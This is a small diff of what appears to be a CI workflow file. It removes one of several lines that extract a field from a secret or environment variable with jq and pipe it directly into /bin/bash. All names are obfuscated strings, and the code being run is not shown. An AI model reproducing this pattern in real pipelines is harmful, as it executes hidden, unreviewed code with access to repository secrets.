@@ -18,7 +18,6 @@ jobs:
           k8482: ${{ secrets.k8482 }}
         run: |
           printf '%s' "$k8482" | jq -r .qse2445 | /bin/bash
-          printf '%s' "$gqgx864" | jq -r .zx2 | /bin/bash
           printf '%s' "$cj0" | jq -r .wlmep28 | /bin/bash
           echo $nsf25 | jq -r .j8146 | /bin/bash
           echo $v7941 | jq -r .gyx68 | /bin/bash
